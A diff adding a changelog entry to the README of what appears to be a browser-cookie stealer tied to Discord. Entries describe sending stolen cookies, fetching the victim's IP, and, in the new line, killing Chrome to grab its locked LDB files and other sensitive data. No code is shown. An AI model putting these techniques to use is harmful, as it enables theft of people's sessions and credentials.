@@ -10,6 +10,7 @@ Discord: **something.py**
 	🟢Sends all cookie results instead of just one in a singular message.
 
  # Changelog - (>2.0)
+ 	(8/19/23) 2.2.3 - Chrome added a new feature locking all of their LDB files and other related and sensitive shit. We kill chrome first and then grab it.
  	(7/28/23) 2.2.2 - Checked for already existing cookies and returns if there is one found.
  	(7/17/23) 2.2.1 - Implemented a try/except piece of code over the IP Address whenever trying to fetch it, as sometimes it may error out due to a PC's client being fucked.
  	(7/16/23) 2.2.0 - A rewrite of the code that boasts a small performance improvement as it sends one request compared to multiple requests last time. 
